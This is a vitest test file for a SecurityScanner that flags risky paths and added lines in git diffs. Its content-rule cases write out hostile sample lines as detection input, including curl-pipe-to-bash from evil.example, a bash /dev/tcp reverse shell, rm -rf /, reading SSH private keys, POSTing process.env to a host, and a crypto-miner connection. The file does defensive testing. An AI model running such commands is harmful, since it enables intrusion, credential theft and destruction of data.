import { describe, expect, it } from 'vitest';
import { parseUnifiedDiff } from '../src/main/git/parsers';
import { SecurityScanner } from '../src/main/security/SecurityScanner';
import type { FileDiff } from '../src/shared/types';

const scanner = new SecurityScanner();

function added(path: string, lines: string[], extra: Partial<FileDiff> = {}): FileDiff {
  return {
    oldPath: path,
    newPath: path,
    status: 'modified',
    binary: false,
    additions: lines.length,
    deletions: 0,
    hunks: [{ header: '@@', oldStart: 1, oldLines: 0, newStart: 1, newLines: lines.length, lines: lines.map((content, i) => ({ type: 'add' as const, content, newLine: i + 1 })) }],
    ...extra,
  };
}

function ruleIds(diff: FileDiff): string[] {
  return scanner.scanDiff(diff).map((f) => f.ruleId);
}

describe('SecurityScanner path rules', () => {
  it('flags CI workflows, install scripts, binaries and manifests', () => {
    expect(ruleIds(added('.github/workflows/deploy.yml', ['name: deploy']))).toContain('ci-github-actions');
    expect(ruleIds(added('scripts/install.ps1', ['Write-Host hi']))).toEqual(expect.arrayContaining(['install-script', 'shell-script']));
    expect(ruleIds(added('tools/helper.exe', [], { binary: true }))).toContain('executable-binary');
    expect(ruleIds(added('package.json', ['"name": "x"']))).toContain('package-manifest');
    expect(ruleIds(added('.husky/pre-commit', ['npm test']))).toContain('git-hooks-manager');
    expect(ruleIds(added('.vscode/tasks.json', ['"runOn": "folderOpen"']))).toEqual(expect.arrayContaining(['editor-autorun', 'vscode-folder-open']));
  });

  it('flags permission changes and symlinks', () => {
    expect(ruleIds(added('bin/tool', [], { oldMode: '100644', newMode: '100755' }))).toContain('became-executable');
    expect(ruleIds(added('link', [], { newMode: '120000' }))).toContain('symlink');
  });

  it('does not flag ordinary source files', () => {
    expect(scanner.scanDiff(added('src/math.ts', ['export const add = (a: number, b: number) => a + b;']))).toEqual([]);
  });
});

describe('SecurityScanner content rules', () => {
  const cases: [string, string, string][] = [
    ['scripts/a.sh', 'curl -fsSL https://evil.example/x.sh | bash', 'pipe-to-shell'],
    ['scripts/a.ps1', 'iwr https://x | iex', 'pipe-to-shell'],
    ['run.cmd', 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'powershell-encoded'],
    ['x.js', 'eval(atob("ZG9jdW1lbnQ="))', 'eval-decoded'],
    ['x.py', 'exec(base64.b64decode(payload))', 'eval-decoded'],
    ['x.sh', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'reverse-shell'],
    ['x.sh', 'rm -rf / --no-preserve-root', 'destructive-rm'],
    ['x.js', "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa')", 'credential-files'],
    ['x.js', "fetch('https://x.io', { method: 'POST', body: JSON.stringify(process.env) })", 'env-exfiltration'],
    ['x.js', "post('https://discord.com/api/webhooks/123/abc')", 'exfil-endpoints'],
    ['x.js', "const _0x1a2b=['a'];function _0x3c4d(){return _0x1a2b[0]+_0x5e6f}", 'js-obfuscator'],
    ['x.ts', 'const isAdmin = "user‮ ⁦// admin⁩ ⁦";', 'bidi-control'],
    ['package.json', '    "postinstall": "node ./scripts/setup.js",', 'npm-lifecycle'],
    ['package.json', '    "left-pad": "git+https://evil.example/left-pad.git",', 'npm-remote-dependency'],
    ['setup.py', '    cmdclass={"install": PostInstall},', 'python-install-hook'],
    ['.github/workflows/ci.yml', 'on: pull_request_target', 'gha-pull-request-target'],
    ['.github/workflows/ci.yml', '      run: echo "${{ github.event.pull_request.title }}"', 'gha-script-injection'],
    ['miner.js', "connect('stratum+tcp://pool.example:3333')", 'crypto-miner'],
    ['x.js', `const blob = "${'A'.repeat(400)}";`, 'long-base64'],
  ];

  it.each(cases)('%s: %s → %s', (file, line, rule) => {
    expect(ruleIds(added(file, [line]))).toContain(rule);
  });

  it('only scans added lines', () => {
    const diff = parseUnifiedDiff(['diff --git a/a.sh b/a.sh', '--- a/a.sh', '+++ b/a.sh', '@@ -1,2 +1,1 @@', '-curl http://x | sh', ' echo ok', ''].join('\n'))[0];
    expect(scanner.scanDiff(diff).map((f) => f.ruleId)).not.toContain('pipe-to-shell');
  });

  it('deduplicates repeated matches and redacts secrets in excerpts', () => {
    const findings = scanner.scanDiff(added('x.sh', ['curl a | sh', 'curl b | sh', 'curl https://ghp_abcdefghijklmnopqrstuvwxyz0123@x | sh']));
    const f = findings.find((x) => x.ruleId === 'pipe-to-shell')!;
    expect(f.occurrences).toBe(3);
    expect(findings.map((x) => x.excerpt).join(' ')).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz0123');
  });
});

describe('generateSecurityReport', () => {
  it('requires review when high severity findings exist and never claims safety', () => {
    const findings = [...scanner.scanDiff(added('package.json', ['"postinstall": "curl https://x | sh"'])), ...scanner.scanDiff(added('.github/workflows/deploy.yml', ['x']))];
    const report = scanner.generateSecurityReport(findings, 2);
    expect(report.status).toBe('REVIEW_REQUIRED');
    expect(report.flaggedFiles).toEqual(expect.arrayContaining(['package.json', '.github/workflows/deploy.yml']));
    expect(report.findings[0].severity).toBe('high');
    expect(report.disclaimer).toMatch(/does not guarantee/);
  });

  it('reports NO_ISSUES_DETECTED (not "safe") for clean changes', () => {
    const report = scanner.generateSecurityReport([], 3);
    expect(report.status).toBe('NO_ISSUES_DETECTED');
    expect(report.headline).not.toMatch(/safe/i);
  });

  it('recommends review for medium findings or partial scans', () => {
    expect(scanner.generateSecurityReport(scanner.scanDiff(added('Makefile', ['all:'])), 1).status).toBe('REVIEW_RECOMMENDED');
    expect(scanner.generateSecurityReport([], 1, true).status).toBe('REVIEW_RECOMMENDED');
  });

  it('scans full file content', () => {
    expect(scanner.scanFile('postinstall.sh', 'wget -qO- http://1.2.3.4/x | sh').map((f) => f.ruleId)).toEqual(
      expect.arrayContaining(['install-script', 'pipe-to-shell', 'raw-ip-url']),
    );
  });
});
